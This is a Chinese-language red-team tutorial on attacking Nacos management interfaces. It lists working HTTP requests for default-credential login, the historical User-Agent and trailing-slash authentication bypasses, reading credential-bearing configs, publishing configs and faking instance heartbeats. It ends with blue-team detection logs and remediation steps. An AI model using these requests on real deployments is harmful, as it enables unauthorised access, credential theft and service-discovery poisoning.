---
title: "Nacos管理面打点与API利用技术"
weight: 63
---

# Nacos管理面打点与API利用技术

`Nacos` 是典型的高价值微服务管理平面。它同时承载：

- 服务注册与发现
- 配置中心
- 命名空间隔离
- 用户与权限
- 集群节点与 Leader 状态
- 客户端连接、订阅与监听关系

对攻击者来说，Nacos 的价值不在于“有一个控制台可以登录”，而在于它把业务命名、服务实例、配置正文、命名空间、集群成员、订阅者和一部分控制操作统一暴露到同一套 Web 控制台与 HTTP API 上。一旦 Nacos 被暴露到低信任网络、默认未开启鉴权、历史版本存在认证绕过、默认口令未修改，或某个只读 Token 权限过宽，攻击者往往可以在很短时间内回收：

- 内部服务名称、分组、集群与实例地址
- 配置中心中的连接串、账号密码、密钥材料
- 历史配置版本与配置变更轨迹
- 命名空间与环境划分
- 集群节点与当前 Leader
- 客户端注册、订阅与长轮询关系

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Nacos
2. 如何围绕认证、配置中心、注册中心与命名空间建立资产画像
3. 如何从历史鉴权问题与管理接口判断真实风险
4. 哪些请求与响应最值得完整保留
5. 蓝队如何从访问日志、鉴权日志、客户端日志与指标识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

首轮至少应枚举：

- `8848/tcp`
- `9848/tcp`
- `9849/tcp`
- `/nacos/`
- `/nacos/v1/console/health`
- `/nacos/v1/auth/login`
- `/nacos/v1/auth/users`
- `/nacos/v1/cs/configs`
- `/nacos/v1/cs/configs/listener`
- `/nacos/v1/cs/history`
- `/nacos/v1/ns/catalog/services`
- `/nacos/v1/ns/service/list`
- `/nacos/v1/ns/instance/list`
- `/nacos/v1/ns/operator/servers`
- `/nacos/v1/ns/raft/state`
- `/nacos/v1/console/namespaces`
- `/nacos/v3/admin/core/cluster/node/list`
- `/nacos/v3/admin/ns/client/list`
- `/nacos/v3/admin/cs/config/listener`

### 0.2 认证方式与安全边界

Nacos 常见认证边界包括：

- 未开启认证
- 用户名密码登录后换取 `accessToken`
- `server identity` 头机制
- 历史 `User-Agent: Nacos-Server` 旁路
- JWT Secret 配置

官方认证文档明确指出：

- 默认配置下 `nacos.core.auth.enabled=false`
- Nacos 自带的是弱认证实现
- 不应暴露在不可信网络环境

这意味着对于攻击者来说，Nacos 的首轮判断非常直接：

1. 是否根本没有启用鉴权
2. 是否仍然使用默认弱口令
3. 是否存在历史版本认证绕过
4. 是否只做了表面鉴权，但仍暴露了大量只读接口

### 0.3 打点收益优先级

按“最快转成真实攻击价值”的顺序，Nacos 的打点收益一般可排为：

1. 确认是否为 Nacos、版本风格、鉴权是否开启
2. 枚举命名空间、服务列表、实例列表与集群节点
3. 枚举配置中心正文、历史配置与监听关系
4. 判断是否存在历史认证绕过、默认口令或过宽管理接口
5. 判断是否存在客户端连接、订阅关系和更高权限的 Admin API 面

---

## 1. 第一轮打点：确认是否为 Nacos

### 1.1 控制台与首页识别

#### 请求示例

```http
GET /nacos/ HTTP/1.1
Host: nacos.target.example:8848
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html;charset=UTF-8
```

页面或资源中常见识别特征包括：

- `Nacos`
- `nacos-console`
- `login`
- `namespace`
- `configuration management`

### 1.2 `/nacos/v1/console/health`

这是最适合作为快速探针的接口之一。

#### 请求示例

```http
GET /nacos/v1/console/health HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "mysql": "UP",
  "raft": "UP",
  "status": "UP"
}
```

这条响应会直接暴露：

- 后端依赖状态
- 集群是否处于健康状态
- 目标基本就是 Nacos 控制面

### 1.3 鉴权默认关闭的现实风险

官方文档明确写出：

```properties
nacos.core.auth.enabled=false
```

这意味着很多“按文档快速部署”的环境，本身就可能在未开启任何鉴权的情况下直接把配置中心与注册中心开放出来。

### 1.4 默认登录接口

#### 请求示例

```http
POST /nacos/v1/auth/login HTTP/1.1
Host: nacos.target.example:8848
Content-Type: application/x-www-form-urlencoded
Connection: close

username=nacos&password=nacos
```

#### 典型成功响应示例

```json
{
  "accessToken": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc2MDQ4OTQ0M30.3P0xYt1Yw2l0KQXWw1C8R7F4x1A7xfB9tV9r6Pq6Q6s",
  "tokenTtl": 18000,
  "globalAdmin": true
}
```

#### 典型失败响应示例

```json
{
  "code": 403,
  "message": "user not found!"
}
```

这条接口是所有后续 API 访问的关键分界点，因为：

- 若成功，后续 `accessToken` 可以直接带入配置中心与命名服务接口
- 若失败，不代表没有风险，还要继续判断是否未启用鉴权或存在历史旁路

---

## 2. 第二轮打点：认证、用户与历史旁路

### 2.1 `accessToken` 的使用方式

官方认证文档说明，登录成功后可直接把 `accessToken` 追加到后续 URL。

#### 请求示例

```http
GET /nacos/v1/cs/configs?accessToken=eyJhbGciOi...&dataId=payment-prod.yml&group=DEFAULT_GROUP HTTP/1.1
Host: nacos.target.example:8848
Accept: */*
Connection: close
```

这类设计的现实风险在于：

- Token 会进入代理日志
- Token 可能进入浏览器历史
- Token 可能进入运维脚本和命令行历史

### 2.2 `/nacos/v1/auth/users`

在高风险版本和弱配置场景中，这条接口的价值非常高。

#### 请求示例

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型成功响应示例

```json
{
  "totalCount": 2,
  "pageNumber": 1,
  "pagesAvailable": 1,
  "pageItems": [
    {
      "username": "nacos",
      "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
    },
    {
      "username": "ops-admin",
      "password": "$2a$10$p7Z9bb6DFfH4bP9YeLeUT.Y0m0JmZQ2IXnCj86vLq7K2b9xkYw4mS"
    }
  ]
}
```

这类返回说明：

- 当前请求已绕过或满足认证
- 已经进入用户管理平面
- 后续可以进一步判断是否能新增用户

### 2.3 历史 `User-Agent: Nacos-Server` 旁路

官方 issue 与修复讨论明确说明，历史版本中存在基于 `User-Agent: Nacos-Server` 的认证旁路问题。其风险在于：

- 只要请求头以 `Nacos-Server` 开头
- 过滤器就会跳过后续认证逻辑

#### 请求示例

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
Host: nacos.target.example:8848
User-Agent: Nacos-Server
Accept: application/json
Connection: close
```

#### 典型成功响应示例

```json
{
  "totalCount": 1,
  "pageNumber": 1,
  "pagesAvailable": 1,
  "pageItems": [
    {
      "username": "nacos",
      "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
    }
  ]
}
```

一旦这里成功，后续常见动作就会包括：

- 读取用户列表
- 创建新用户
- 登录控制台
- 读取与修改配置

### 2.4 `server identity` 修复与路径旁路

官方认证文档说明，`1.4.1` 起引入了 `server identity key/value` 用来替代 `User-Agent` 判断，但 issue 同时说明：

- 某些版本仍可通过路径尾部斜杠等方式让 `AuthFilter` 失效
- 例如 `--path-as-is` 场景下的 `.../users/` 能绕过缓存的 Method 映射

#### 请求示例

```http
POST /nacos/v1/auth/users/?username=test&password=test HTTP/1.1
Host: nacos.target.example:8848
X-Server-Identity: wrong-value
Connection: close
```

#### 典型成功响应示例

```json
{
  "code": 200,
  "message": "create user ok!",
  "data": null
}
```

### 2.5 失败响应也有价值

#### 典型失败响应示例

```json
{
  "timestamp": "2026-06-15T20:15:09.110+08:00",
  "status": 403,
  "error": "Forbidden",
  "message": "user not found!",
  "path": "/nacos/v1/auth/users"
}
```

这类返回说明：

- 目标已开启鉴权或已修复旁路
- 后续更应转向默认口令、已泄露 `accessToken`、运维脚本和客户端配置文件

---

## 3. 第三轮打点：配置中心

### 3.1 读取配置正文

官方 Open API 文档中，配置中心的核心读取接口是 `/nacos/v1/cs/configs`。

#### 请求示例

```http
GET /nacos/v1/cs/configs?tenant=prod&dataId=payment-prod.yml&group=DEFAULT_GROUP HTTP/1.1
Host: nacos.target.example:8848
Accept: */*
Connection: close
```

#### 典型响应示例

```yaml
spring:
  datasource:
    url: jdbc:mysql://10.20.42.18:3306/payment
    username: payment_app
    password: Str0ngPass!2026
redis:
  host: 10.20.41.15
  password: redis-prod-pass
```

这类返回的价值极高，因为它会直接带出：

- 数据库连接串
- 中间件地址
- 明文口令
- 环境隔离方式

### 3.2 长轮询监听

官方文档明确说明，配置监听接口本质上是 30 秒长轮询，用于判断本地 MD5 与服务端是否一致。

#### 请求示例

```http
POST /nacos/v1/cs/configs/listener HTTP/1.1
Host: nacos.target.example:8848
Content-Type: application/x-www-form-urlencoded
Long-Pulling-Timeout: 30000
Connection: close

Listening-Configs=payment-prod.yml%02DEFAULT_GROUP%02d41d8cd98f00b204e9800998ecf8427e%02prod%01
```

#### 典型有变更响应示例

```text
payment-prod.yml%02DEFAULT_GROUP%02prod%01
```

#### 典型无变更响应示例

```text

```

这类接口对打点的意义在于：

- 不只是“读当前值”
- 还能持续感知哪些配置在变
- 便于判断哪些配置是高活跃业务配置

### 3.3 发布配置

#### 请求示例

```http
POST /nacos/v1/cs/configs HTTP/1.1
Host: nacos.target.example:8848
Content-Type: application/x-www-form-urlencoded
Connection: close

tenant=prod&dataId=payment-prod.yml&group=DEFAULT_GROUP&content=contentTest
```

#### 典型响应示例

```text
true
```

一旦这类写操作成功，风险已经从“配置读取”升级为“业务配置篡改”。

### 3.4 历史配置与回溯

Open API 文档明确提供：

- 配置历史列表
- 历史详情
- 前一个版本查询

#### 请求示例

```http
GET /nacos/v1/cs/history?dataId=payment-prod.yml&group=DEFAULT_GROUP&tenant=prod&pageNo=1&pageSize=20 HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "totalCount": 3,
  "pageNumber": 1,
  "pagesAvailable": 1,
  "pageItems": [
    {
      "id": 309135486247505920,
      "dataId": "payment-prod.yml",
      "group": "DEFAULT_GROUP",
      "modifiedTime": "2026-06-14 22:31:44"
    }
  ]
}
```

这类历史接口尤其适合回收：

- 凭据是否曾被轮换
- 配置修改时间线
- 哪些配置长期活跃

---

## 4. 第四轮打点：注册中心、服务发现与客户端画像

### 4.1 服务列表

#### 请求示例

```http
GET /nacos/v1/ns/service/list?pageNo=1&pageSize=100&namespaceId=public&groupName=DEFAULT_GROUP HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "count": 3,
  "doms": [
    "DEFAULT_GROUP@@gateway-service",
    "DEFAULT_GROUP@@payment-api",
    "DEFAULT_GROUP@@user-service"
  ]
}
```

这类返回会直接暴露：

- 业务命名体系
- 分组方式
- 微服务边界

### 4.2 实例列表

#### 请求示例

```http
GET /nacos/v1/ns/instance/list?serviceName=DEFAULT_GROUP@@payment-api&namespaceId=public&healthyOnly=false HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "name": "DEFAULT_GROUP@@payment-api",
  "groupName": "DEFAULT_GROUP",
  "clusters": "",
  "cacheMillis": 10000,
  "hosts": [
    {
      "instanceId": "10.20.41.27#8080#DEFAULT#DEFAULT_GROUP@@payment-api",
      "ip": "10.20.41.27",
      "port": 8080,
      "weight": 1,
      "healthy": true,
      "enabled": true,
      "ephemeral": true,
      "clusterName": "DEFAULT",
      "serviceName": "DEFAULT_GROUP@@payment-api",
      "metadata": {
        "version": "2.14.7",
        "zone": "az1"
      },
      "instanceHeartBeatInterval": 5000,
      "instanceHeartBeatTimeOut": 15000,
      "ipDeleteTimeout": 30000
    }
  ],
  "lastRefTime": 1760501981544,
  "checksum": "",
  "allIPs": false,
  "valid": true
}
```

这类返回适合直接建立：

- 实例 IP 与端口
- `ephemeral` 还是持久实例
- 心跳超时参数
- 业务元数据

### 4.3 Catalog 服务视图

#### 请求示例

```http
GET /nacos/v1/ns/catalog/services?pageNo=1&pageSize=100&namespaceId=public HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "count": 2,
  "serviceList": [
    {
      "name": "DEFAULT_GROUP@@payment-api",
      "groupName": "DEFAULT_GROUP",
      "clusterCount": 1,
      "ipCount": 6,
      "healthyInstanceCount": 6,
      "triggerFlag": false
    }
  ]
}
```

### 4.4 客户端心跳与元数据改写面

Open API 文档同时提供：

- 注册实例
- 注销实例
- 修改实例
- 发送心跳
- 批量修改实例元数据

一旦这些接口可写，攻击价值会进一步上升到：

- 伪造服务实例
- 修改实例状态
- 污染服务发现
- 引导流量错误路由

#### 请求示例

```http
PUT /nacos/v1/ns/instance/beat?serviceName=DEFAULT_GROUP@@payment-api&beat={"cluster":"DEFAULT","ip":"10.20.41.27","metadata":{},"port":8080,"scheduled":true,"serviceName":"DEFAULT_GROUP@@payment-api","weight":1} HTTP/1.1
Host: nacos.target.example:8848
Connection: close
```

#### 典型响应示例

```json
{
  "clientBeatInterval": 5000,
  "code": 10200,
  "lightBeatEnabled": true
}
```

---

## 5. 第五轮打点：命名空间、节点与集群状态

### 5.1 命名空间

#### 请求示例

```http
GET /nacos/v1/console/namespaces HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "data": [
    {
      "namespace": "public",
      "namespaceShowName": "Public",
      "namespaceDesc": "",
      "configCount": 128,
      "type": 0
    },
    {
      "namespace": "prod",
      "namespaceShowName": "Production",
      "namespaceDesc": "online env",
      "configCount": 942,
      "type": 2
    }
  ]
}
```

这类响应可以直接帮助判断：

- 环境隔离方式
- 生产命名空间
- 哪个 namespace 最值得优先打点

### 5.2 服务器列表

Open API 文档明确提供“查询 server list”和“查询当前 leader”。

#### 请求示例

```http
GET /nacos/v1/ns/operator/servers HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "ip": "10.20.30.51",
    "port": 8848,
    "state": "UP",
    "extendInfo": {
      "raftPort": 7848,
      "site": "DEFAULT_SITE"
    }
  },
  {
    "ip": "10.20.30.52",
    "port": 8848,
    "state": "UP",
    "extendInfo": {
      "raftPort": 7848,
      "site": "DEFAULT_SITE"
    }
  }
]
```

### 5.3 Raft 状态

#### 请求示例

```http
GET /nacos/v1/ns/raft/state HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "leader": "10.20.30.51:7848",
  "term": 128,
  "raftMetaData": {
    "commitIndex": 991241
  }
}
```

这类接口的价值在于：

- 直接暴露 leader
- 暴露 Raft 元数据
- 帮助判断后续是否值得关注更高权限 Admin API

### 5.4 v3 Admin API

新版本文档明确指出：

- `3.X` 引入了新的 Admin API 体系
- 路径形如 `/nacos/v3/admin/...`
- 能看到节点、客户端、配置监听、连接均衡等运维能力

#### 请求示例

```http
GET /nacos/v3/admin/core/cluster/node/list HTTP/1.1
Host: nacos.target.example:8848
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "code": 0,
  "message": "success",
  "data": [
    {
      "nodeId": "10.20.30.51:8848",
      "state": "UP",
      "extendInfo": {
        "sdkPort": 9848
      }
    }
  ]
}
```

---

## 6. 高危错误部署场景

### 6.1 未开启鉴权

官方文档已经明确指出默认是：

```properties
nacos.core.auth.enabled=false
```

这意味着很多环境在没有任何口令和 Token 的情况下，就可能直接开放：

- 配置读取
- 服务实例枚举
- 命名空间枚举
- 集群节点枚举

### 6.2 默认口令或默认账户残留

如果环境仍保留：

- `nacos / nacos`

那么风险通常不止是“进控制台看看”，而是：

- 直接拿到 `accessToken`
- 继续进入配置修改与实例管理

### 6.3 `User-Agent: Nacos-Server` 历史旁路

这是 Nacos 历史上最有代表性的认证问题之一。它的攻击收益不是停留在“能绕过一个检测”，而是会直接转成：

- 枚举用户
- 新增用户
- 登录控制台
- 获取或修改配置

### 6.4 `server identity` 修复不彻底

历史修复里引入了：

- `nacos.core.auth.enable.userAgentAuthWhite=false`
- `nacos.core.auth.server.identity.key`
- `nacos.core.auth.server.identity.value`

但 issue 同时说明某些版本里仍存在路径构造旁路。因此对老版本来说，仅仅看到启用了 `server identity` 不足以直接判定安全。

### 6.5 默认 JWT Secret 风险

官方文档明确提醒：

- 文档示例中的 `nacos.core.auth.default.token.secret.key` 是公开值
- 实际部署必须替换
- `2.2.1` 之后社区版本不再继续沿用文档默认值

这意味着在旧环境里，一旦 Secret 没改，攻击者就可能进一步研究：

- Token 伪造
- 集群节点间 403 与失配行为
- 历史配置泄露带来的 Secret 回收

---

## 7. 蓝队检测与处置

### 7.1 反向代理与访问日志

应重点识别对以下路径的连续访问：

- `/nacos/v1/console/health`
- `/nacos/v1/auth/login`
- `/nacos/v1/auth/users`
- `/nacos/v1/cs/configs`
- `/nacos/v1/cs/configs/listener`
- `/nacos/v1/cs/history`
- `/nacos/v1/ns/service/list`
- `/nacos/v1/ns/instance/list`
- `/nacos/v1/ns/operator/servers`
- `/nacos/v1/ns/raft/state`
- `/nacos/v1/console/namespaces`
- `/nacos/v3/admin/*`

#### 日志示例

```text
10.10.10.21 - - [16/Jun/2026:00:21:11 +0800] "GET /nacos/v1/console/health HTTP/1.1" 200 44 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [16/Jun/2026:00:21:13 +0800] "GET /nacos/v1/ns/service/list?pageNo=1&pageSize=100&namespaceId=public&groupName=DEFAULT_GROUP HTTP/1.1" 200 129 "-" "python-requests/2.32.3"
```

```text
10.10.10.21 - - [16/Jun/2026:00:21:16 +0800] "GET /nacos/v1/cs/configs?tenant=prod&dataId=payment-prod.yml&group=DEFAULT_GROUP HTTP/1.1" 200 287 "-" "python-requests/2.32.3"
```

第三类日志通常说明访问者已从产品识别进入配置正文回收阶段。

### 7.2 认证与服务端日志

Nacos 认证文档和客户端日志资料表明，调查时应重点关联：

- 认证失败与 403
- 用户登录成功
- `Invalid server identity value`
- config 与 naming 模块日志
- 客户端 `naming.log`、`config.log`、`remote.log`

#### 服务端日志示例

```text
2026-06-16 00:21:18,114 WARN AuthFilter - Invalid server identity value for X-Server-Identity from 10.10.10.21
```

#### 服务端日志示例

```text
2026-06-16 00:21:22,447 INFO ConfigServletInner - get config, dataId=payment-prod.yml, group=DEFAULT_GROUP, tenant=prod, clientIp=10.10.10.21
```

#### 客户端日志示例

```text
2026-06-16 00:21:24.003 INFO [main] [com.alibaba.nacos.client.config.impl.ClientWorker] [check-update] dataId=payment-prod.yml, group=DEFAULT_GROUP, tenant=prod changed
```

### 7.3 指标与连接画像

官方文档说明 Nacos 可暴露监控指标，`3.X` Admin API 还可查询客户端连接与订阅关系。蓝队应重点关注：

- 非常规来源查询客户端列表
- 非常规来源访问配置监听接口
- 某来源短时间内批量遍历 namespace、service、config

### 7.4 处置建议

发现 Nacos 管理面被打点后，应优先做：

1. 收敛 `8848` 以及相关 gRPC 端口对低信任网络的暴露
2. 立即确认 `nacos.core.auth.enabled` 是否开启
3. 强制轮换默认账户、弱口令与已泄露 `accessToken`
4. 检查 `nacos.core.auth.enable.userAgentAuthWhite`、`server.identity.key/value` 与 JWT Secret 配置
5. 检查是否已有配置正文、历史配置、实例元数据被读取或修改
6. 审核 `v3/admin`、命名空间、用户管理与实例管理相关访问日志

长期建议：

- 不把 Nacos 暴露到公网
- 开启鉴权并替换公开默认 Secret
- 禁止继续依赖 `User-Agent` 白名单信任
- 对 `/v1/auth/*`、`/v1/cs/*`、`/v1/ns/*`、`/v3/admin/*` 建独立告警
- 对配置中心中的数据库、Redis、消息队列和云凭据做定期轮换

---

## 8. 复盘清单

### 8.1 红队侧

- 是否确认了鉴权是否真正开启
- 是否验证了默认口令、`User-Agent` 旁路与 `server identity` 历史问题
- 是否完成了 namespace、service、instance、config、history 的整体画像
- 是否判断了 `v3/admin` 与客户端连接面的可见性
- 是否验证了实例修改、配置发布等写操作边界

### 8.2 蓝队侧

- 是否能识别从 `health -> login -> namespaces -> service/list -> cs/configs` 的连续访问链
- 是否能识别异常的长轮询 `listener` 请求
- 是否能从代理日志和 Nacos 服务端日志中关联同一来源
- 是否掌握了所有默认账户、旧版本节点与未替换 Secret 的部署

### 8.3 应急侧

- 是否确认是否已有配置正文、历史配置和实例元数据被导出
- 是否确认是否已有异常用户被创建
- 是否完成默认账户、JWT Secret、配置凭据与下游服务凭据轮换
- 是否完成公网暴露面、旧版本节点与历史旁路风险收敛

---

## 9. 总结

`Nacos` 的真正风险，不只是“注册中心或配置中心对外开放”，而在于它会把：

- 服务拓扑
- 配置正文
- 命名空间
- 集群节点
- 客户端订阅关系
- 用户与鉴权
- 历史配置变更

统一暴露给同一套控制台与 HTTP API。

对打点来说，更值得沉淀的方法学是：

- 先确认是否为 Nacos，以及鉴权是否真的启用
- 再用 namespace、service、instance 和 server list 建立基础画像
- 再集中验证配置中心正文、历史配置与监听关系
- 最后判断历史认证绕过、Admin API 与写操作面是否存在

只有把这些面串起来，才能把“Nacos 暴露”真正转化成结构化攻击价值判断。

---

## 参考资料

- [Open API Guide](https://nacos.io/en-us/docs/open-api.html)
- [Open API Guide 1.X](https://nacos.io/en/docs/1.X/open-api/)
- [Open API Guide v1](https://nacos.io/en/docs/v1/open-api/)
- [Authentication](https://nacos.io/en-us/docs/auth.html)
- [Authentication 2.X](https://nacos.io/en/docs/auth/)
- [Authentication 1.X](https://nacos.io/en/docs/v1/auth/)
- [Admin API 3.X](https://nacos.io/en/docs/latest/manual/admin/admin-api/)
- [Admin API 3.0](https://nacos.io/en/docs/v3.0/manual/admin/admin-api/)
- [Report a security vulnerability in nacos to bypass authentication](https://github.com/alibaba/nacos/issues/4593)
- [Report a security vulnerability in nacos to bypass authentication(identity) again](https://github.com/alibaba/nacos/issues/4701)
